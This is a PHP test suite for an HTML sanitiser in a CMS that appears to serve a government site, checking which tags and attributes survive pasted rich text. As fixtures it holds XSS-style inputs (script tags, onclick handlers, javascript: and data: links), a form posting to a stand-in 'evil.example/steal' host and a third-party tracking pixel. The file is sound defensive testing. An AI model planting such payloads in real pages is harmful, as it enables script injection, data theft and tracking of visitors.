<?php

use App\Support\RichTextSanitiser;

it('strips a script tag', function () {
    $dirty = '<p>Hello</p><script>alert(1)</script>';

    expect(RichTextSanitiser::sanitise($dirty))->not->toContain('script')
        ->and(RichTextSanitiser::sanitise($dirty))->toContain('Hello');
});

it('strips an inline event handler', function () {
    $dirty = '<p onclick="alert(1)">Hello</p>';

    expect(RichTextSanitiser::sanitise($dirty))->not->toContain('onclick');
});

it('strips a javascript href but keeps the link text', function () {
    $dirty = '<a href="javascript:alert(1)">Click</a>';
    $clean = RichTextSanitiser::sanitise($dirty);

    expect($clean)->not->toContain('javascript:')
        ->and($clean)->toContain('Click');
});

it('strips a data href but keeps the link text', function () {
    $dirty = '<a href="data:text/html,alert(1)">Click</a>';
    $clean = RichTextSanitiser::sanitise($dirty);

    expect($clean)->not->toContain('data:')
        ->and($clean)->toContain('Click');
});

it('strips a style attribute', function () {
    $dirty = '<p style="display:none">Hello</p>';
    $clean = RichTextSanitiser::sanitise($dirty);

    expect($clean)->not->toContain('style')
        ->and($clean)->toContain('Hello');
});

it('strips a form and its input', function () {
    $dirty = '<form action="https://evil.example/steal"><input type="text" name="x"></form>';
    $clean = RichTextSanitiser::sanitise($dirty);

    expect($clean)->not->toContain('<form')
        ->and($clean)->not->toContain('<input');
});

it('keeps legitimate formatting and links', function () {
    $clean = RichTextSanitiser::sanitise(
        '<h3>Waste</h3><p><strong>Bold</strong> and <em>italic</em></p>'
        .'<ul><li>One</li></ul><a href="/waste-and-recycling">Local</a>'
        .'<a href="https://gov.nu">External</a>'
    );

    expect($clean)->toContain('<h3>')
        ->and($clean)->toContain('<strong>')
        ->and($clean)->toContain('<li>')
        ->and($clean)->toContain('/waste-and-recycling')
        ->and($clean)->toContain('https://gov.nu');
});

it('unwraps h1 and h2 in body content but keeps their words, and leaves h3 untouched', function () {
    // <h1> is the page title and <h2> is a block's own heading — both are
    // reserved outside the rich-text body (see rich-text.blade.php). A
    // heading pasted into body content (e.g. from Word) must not silently
    // become a real <h1>/<h2> in the page's heading structure, but the
    // editor's words must survive so there's a visible signal to reformat.
    $clean = RichTextSanitiser::sanitise('<h1>Big</h1><h2>Medium</h2><h3>Small</h3>');

    expect($clean)->not->toContain('<h1>')
        ->and($clean)->not->toContain('<h2>')
        ->and($clean)->toContain('Big')
        ->and($clean)->toContain('Medium')
        ->and($clean)->toContain('<h3>Small</h3>');
});

/*
 * Spec section 6: the allowlist "strips every attribute except `href` on
 * links". A surviving `class` is not cosmetic -- `hidden` is compiled into
 * the stylesheet (the header uses `hidden lg:flex`), so an editor could make
 * a legal notice invisible on the rendered page while it still reads as
 * present in the CMS, and a positioned `fixed inset-0 z-50` block could
 * cover the page. The `prose` wrapper does all the styling the block set
 * needs; no editor-supplied class is required by any partial under
 * resources/views/components/blocks/ or by any seeded content.
 */
it('strips a class attribute but keeps the element and its text', function () {
    $clean = RichTextSanitiser::sanitise('<p class="hidden">Legal notice</p>');

    expect($clean)->not->toContain('class')
        ->and($clean)->not->toContain('hidden')
        ->and($clean)->toContain('<p>')
        ->and($clean)->toContain('Legal notice');
});

it('strips layout-breaking classes from a block element', function () {
    $clean = RichTextSanitiser::sanitise('<div class="fixed inset-0 z-50 bg-white">Overlay</div>');

    expect($clean)->not->toContain('class')
        ->and($clean)->not->toContain('fixed')
        ->and($clean)->toContain('Overlay');
});

it('keeps href on a link -- the one attribute the allowlist permits', function () {
    // Guards the fix from over-reaching: dropping allowAttribute('class')
    // must not take href with it.
    expect(RichTextSanitiser::sanitise('<a href="/waste-and-recycling">Local</a>'))
        ->toContain('href="/waste-and-recycling"');
});

/*
 * ---------------------------------------------------------------------------
 * Attribute EXCLUSIVITY. The test above proves href is included; on its own
 * that says nothing about what else survives, and for a long time a great deal
 * else did. allowSafeElements() grants every attribute W3CReference::ATTRIBUTES
 * marks safe -- around 250 of them, `id`, `title`, `target`, `src`, `alt`,
 * `rel`, `face` among them -- on every safe element. Only `class`, `style`,
 * `hidden`, `contenteditable` and the `on*` handlers are excluded there.
 *
 * These tests fix the spec's actual policy in place: "strips every attribute
 * except `href` on links". Each one was confirmed to fail against the previous
 * config (allowSafeElements() with no attribute reset) -- the fixtures below
 * are attributes that genuinely came through, not attributes the parser was
 * never going to emit.
 * ---------------------------------------------------------------------------
 */
it('strips id, which would otherwise collide with the layout landmark ids', function () {
    // resources/views/components/layouts/public.blade.php gives <main> id="main"
    // and the skip link points at #main; header.blade.php owns #nav-disclosure,
    // #menu-toggle and #mobile-nav. A body paragraph carrying id="main" makes
    // "Skip to main content" land on editor prose instead of the main landmark,
    // and duplicate ids break any aria-labelledby wiring pointed at them.
    $clean = RichTextSanitiser::sanitise('<p id="main">Body</p>');

    expect($clean)->not->toContain('id=')
        ->and($clean)->toContain('<p>Body</p>');
});

it('strips title and target from a link, leaving href alone', function () {
    // target="_blank" opens a government page's links into an uncontrolled new
    // context (and without rel=noopener, which is also not grantable here);
    // title= is an accessibility trap, invisible to keyboard and touch users.
    $clean = RichTextSanitiser::sanitise('<a href="/contact" title="Tooltip" target="_blank">Contact</a>');

    expect($clean)->not->toContain('title=')
        ->and($clean)->not->toContain('target=')
        ->and($clean)->toContain('href="/contact"')
        ->and($clean)->toContain('Contact');
});

it('strips a remote image, so body content cannot make a third-party request', function () {
    // allowRelativeMedias() is never called, but allowedMediaSchemes defaults to
    // http/https/data -- so before the attribute reset an absolute <img src>
    // survived intact. That is a third-party request issued from a government
    // page (a tracking pixel needs nothing more), and it routes around the
    // alt-text requirement every other image path on this site enforces:
    // PageForm's `image` block and the featured-image uploads both make alt
    // required. Images belong to those paths, not to pasted body HTML.
    $clean = RichTextSanitiser::sanitise(
        '<p>Before</p><img src="https://tracker.example/pixel.gif" alt="x"><p>After</p>'
    );

    expect($clean)->not->toContain('tracker.example')
        ->and($clean)->not->toContain('src=')
        ->and($clean)->not->toContain('<img')
        ->and($clean)->toContain('Before')
        ->and($clean)->toContain('After');
});

it('strips presentational attributes carried in by a Word paste', function () {
    // The scenario the sanitiser exists for. `face` on <font> and `lang` on
    // <span> are both marked safe by the W3C reference, so both survived.
    $clean = RichTextSanitiser::sanitise(
        '<div class="WordSection1"><p class="MsoNormal">'
        .'<b><span lang="EN-NZ"><font face="Calibri">Annual report</font></span></b></p></div>'
    );

    expect($clean)->not->toContain('face=')
        ->and($clean)->not->toContain('lang=')
        ->and($clean)->not->toContain('class=')
        ->and($clean)->toContain('Annual report');
});

/*
 * The counterweight. Narrowing attributes must not narrow ELEMENTS: the
 * library's default action for an unconfigured element is Drop, which deletes
 * the element's TEXT as well as its tag. Every button on Filament's default
 * RichEditor toolbar (see RichEditor::getDefaultToolbarButtons()) is
 * represented here, so an over-eager future narrowing of the element set shows
 * up as a failure rather than as content quietly disappearing from a page.
 */
it('keeps every element the RichEditor toolbar can emit, and the text inside unknown wrappers', function () {
    $clean = RichTextSanitiser::sanitise(
        '<p><strong>bold</strong><em>italic</em><u>under</u><s>strike</s>'
        .'<sub>sub</sub><sup>sup</sup><a href="/x">link</a></p>'
        .'<h3>heading three</h3><h4>heading four</h4>'
        .'<blockquote>quoted</blockquote><pre><code>code block</code></pre>'
        .'<ul><li>bullet</li></ul><ol><li>numbered</li></ol>'
        .'<table><tbody><tr><td>cell</td></tr></tbody></table>'
        .'<div><span>wrapped text</span></div><hr><br>'
    );

    foreach (['<strong>', '<em>', '<u>', '<s>', '<sub>', '<sup>', '<a href="/x">',
        '<h3>', '<h4>', '<blockquote>', '<pre>', '<code>', '<ul>', '<ol>', '<li>',
        '<table>', '<tr>', '<td>', '<div>', '<span>'] as $tag) {
        expect($clean)->toContain($tag);
    }

    foreach (['bold', 'italic', 'under', 'strike', 'sub', 'sup', 'link', 'heading three',
        'heading four', 'quoted', 'code block', 'bullet', 'numbered', 'cell',
        'wrapped text'] as $text) {
        expect($clean)->toContain($text);
    }
});

it('returns null unchanged', function () {
    expect(RichTextSanitiser::sanitise(null))->toBeNull();
});

/*
 * ---------------------------------------------------------------------------
 * Input length. HtmlSanitizer::sanitizeFor() truncates its input with a
 * BYTE-offset substr() at HtmlSanitizerConfig::$maxInputLength (20,000 by
 * default) and then, a few lines later, returns '' if the result is not valid
 * UTF-8. Both halves are silent: no exception, no validation message, nothing
 * logged.
 *
 * That was survivable while the sanitiser only ran per rich-text BLOCK on
 * Page. It stopped being survivable when it started running on whole
 * Programme, NewsArticle and Project bodies, which is exactly where a
 * department officer pastes a long report out of Word -- the scenario the
 * sanitiser exists for, and one that passes 20 KB without effort.
 * ---------------------------------------------------------------------------
 */
it('keeps a body far longer than the library default 20 KB input cap', function () {
    $long = '<p>'.str_repeat('a', 25_000).'</p><p>Closing paragraph</p>';

    $clean = RichTextSanitiser::sanitise($long);

    // The tail is what proves it: with the default cap the input was cut at
    // byte 20,000 and everything after it -- here the closing paragraph --
    // was gone from the saved record with no warning.
    expect($clean)->toContain('Closing paragraph')
        ->and(strlen($clean))->toBeGreaterThan(25_000);
});

it('does not blank a body when a multibyte character straddles the byte cap', function () {
    // Constructed to land exactly on the boundary: '<p>' is 3 bytes and 19,996
    // 'a's take the offset to 19,999, so the following U+0113 (0xC4 0x93, two
    // bytes) starts at index 19,999. substr($input, 0, 20_000) keeps 0xC4 and
    // discards 0x93, isValidUtf8() then fails, and sanitizeFor() returns ''.
    // Not truncation -- total loss of the entire body.
    $body = '<p>'.str_repeat('a', 19_996)."\u{0113}".' and the rest of the report</p>';

    // The boundary is real, and the cut really would be invalid UTF-8. Without
    // these two the test could pass on a fixture that never straddled anything.
    expect(strlen('<p>'.str_repeat('a', 19_996)))->toBe(19_999)
        // preg_match() returns false, not 0, on a string containing invalid
        // UTF-8 -- which is precisely the check HtmlSanitizer::isValidUtf8()
        // makes before returning ''.
        ->and(preg_match('//u', substr($body, 0, 20_000)))->toBeFalse();

    $clean = RichTextSanitiser::sanitise($body);

    expect($clean)->not->toBe('')
        ->and($clean)->toContain('and the rest of the report')
        ->and($clean)->toContain("\u{0113}");
});
